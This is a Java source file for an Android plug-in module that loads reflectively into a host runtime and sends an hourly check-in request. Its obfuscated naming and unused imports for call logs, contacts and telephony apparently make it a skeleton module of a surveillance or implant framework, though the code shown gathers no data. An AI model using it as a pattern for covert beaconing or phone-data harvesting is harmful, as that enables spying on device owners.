package zer0.x985d2fcb;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

public class ModuleImpl
{
    private final Module _module;
    private long _lastTimestamp;

    private final int _hash = 0x985d2fcb;
    private Reflect _zRuntime;
    private Context _context;


    public ModuleImpl(final Module module)
    {
        _module = module;
        _lastTimestamp = 0;
    }

    public int getHash()
    {
        return _hash;
    }

    public void onInit(Object zRuntime)
    {
        _zRuntime = Reflect.on(zRuntime);
        _context = _zRuntime.call("getContext").get();
    }

    public void onLoad()
    {
        _zRuntime.call("addCommonTask", _module);
    }

    public void onUnload()
    {
    }

    public void doCommonJob(final long currentMillis)
    {
        boolean ret = ((currentMillis - _lastTimestamp) >= 60L * 60L * 1000L); // one hour
        if (!ret) {
            return;
        }
        _lastTimestamp = currentMillis;

        Object zRequest = _zRuntime.call("createRequest").get();
        _zRuntime.call("requestInit", zRequest, _hash);
        Object zos = _zRuntime.call("requestGetOutputStream", zRequest).get();

        Object zis = null;
        try {
            zis = _zRuntime.call("requestDo", zRequest).get();
            if (zis != null) {
                int result = (int)_zRuntime.call("zisReadInt", zis).get();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            try {
                if (zis != null) {
                    _zRuntime.call("zisClose", zis);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}